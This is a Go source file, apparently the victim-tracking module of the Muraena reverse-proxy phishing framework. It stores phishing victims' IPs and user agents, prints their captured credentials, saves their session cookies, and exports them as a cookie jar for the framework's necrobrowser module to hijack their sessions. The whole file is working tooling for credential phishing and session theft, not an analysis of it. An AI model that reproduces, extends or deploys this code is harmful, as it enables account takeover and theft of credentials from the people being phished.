package tracking

import (
	"encoding/json"
	"fmt"
	"os"
	"time"

	"github.com/muraenateam/muraena/module/necrobrowser"

	"github.com/evilsocket/islazy/tui"

	"github.com/muraenateam/muraena/core/db"
	"github.com/muraenateam/muraena/log"
)

func (module *Tracker) GetVictim(t *Trace) (v *db.Victim, err error) {

	if !t.IsValid() {
		return nil, fmt.Errorf(fmt.Sprintf("GetVictim invalid tracking value [%s]", tui.Bold(tui.Red(t.ID))))
	}

	v, err = db.GetVictim(t.ID)
	if err != nil {
		return nil, err
	}
	return v, nil
}

// ShowCredentials prints the credentials in the CLI
func (module *Tracker) ShowCredentials() {

	columns := []string{
		"ID",
		"Key",
		"Value",
		"Time",
	}

	var rows [][]string

	victims, err := db.GetAllVictims()
	if err != nil {
		module.Debug("error fetching all victims: %s", err)
		return
	}

	module.Debug("All Victims: %v", victims)
	for _, vID := range victims {
		victim, err := db.GetVictim(vID)
		if err != nil {
			module.Debug("error fetching victim %s: %s", vID, err)
			continue
		}

		module.Debug("Creds for victim %s: %d", vID, victim.CredsCount)
		for i := 0; i < victim.CredsCount; i++ {
			t := tui.Green(victim.ID)

			c, err := victim.GetCredentials(i)
			if err != nil {
				module.Debug("error getting victim %s creds at index %d: %s", victim.ID, i, err)
				continue
			}

			rows = append(rows, []string{tui.Bold(t), c.Key, c.Value, c.Time})
		}

	}

	tui.Table(os.Stdout, columns, rows)
}

// ShowVictims prints the list of victims
func (module *Tracker) ExportSession(id string) {

	const timeLayout = "2006-01-02 15:04:05 -0700 MST"

	rawCookies, err := db.GetVictimCookiejar(id)
	if err != nil {
		module.Debug("error fetching victim %d cookie jar: %s", id, err)
	}

	// this extra loop and struct is needed since browsers expect the expiration time in unix time, so also different type
	var cookieJar []necrobrowser.SessionCookie

	for _, c := range rawCookies {
		log.Debug("trying to parse  %s  with layout  %s", c.Expires, timeLayout)
		t, err := time.Parse(timeLayout, c.Expires)
		if err != nil {
			log.Warning("warning: cant's parse Expires field (%s) of cookie %s. skipping cookie", c.Expires, c.Name)
			continue
		}

		nc := necrobrowser.SessionCookie{
			Name:     c.Name,
			Value:    c.Value,
			Domain:   c.Domain,
			Expires:  t.Unix(),
			Path:     c.Path,
			HTTPOnly: c.HTTPOnly,
			Secure:   c.Secure,
			Session:  t.Unix() < 1,
		}

		cookieJar = append(cookieJar, nc)
	}

	cookieJarJson, err := json.Marshal(cookieJar)
	if err != nil {
		module.Warning("Error marshalling the cookieJar: %s", err)
		return
	}

	log.Info("Victim %s CookieJar:\n\n%s", id, cookieJarJson)
}

// ShowVictims prints the list of victims
func (module *Tracker) ShowVictims() {

	columns := []string{
		"ID",
		"IP",
		"UA",
		//"# Credentials",
		//"# Requests",
		//"Cookie Jar",
	}

	var rows [][]string

	victims, err := db.GetAllVictims()
	if err != nil {
		module.Debug("error fetching all victims: %s", err)
	}

	module.Debug("All Victims: %v", victims)

	for _, vId := range victims {

		v, err := db.GetVictim(vId)
		if err != nil {
			module.Debug("error fetching victim %s: %s", vId, err)
		}

		rows = append(rows, []string{tui.Bold(v.ID), v.IP, v.UA})
	}

	tui.Table(os.Stdout, columns, rows)
}

// Push another Victim to the Tracker
func (module *Tracker) Push(v *db.Victim) {
	if err := v.Store(); err != nil {
		module.Debug("error adding victim to redis: %s", err)
	}
}

// AddToCookieJar adds a cookie to jar. if the cookie exists, it will be overridden
func (module *Tracker) AddToCookieJar(victimID string, cookie db.VictimCookie) {

	if cookie.Domain == module.Session.Config.Proxy.Phishing {
		return
	}

	_, err := db.GetVictim(victimID)
	if err != nil {
		module.Debug("ERROR: Victim %s not found in db", victimID)
		return
	}

	err = cookie.Store(victimID)
	if err != nil {
		module.Debug("ERROR: failed to add cookie %s to victim %s", cookie.Name, victimID)
		return
	}

	module.Debug("[%s] New victim cookie: %s on %s with value %s",
		victimID, tui.Bold(cookie.Name), tui.Bold(cookie.Domain), tui.Bold(cookie.Value))
}
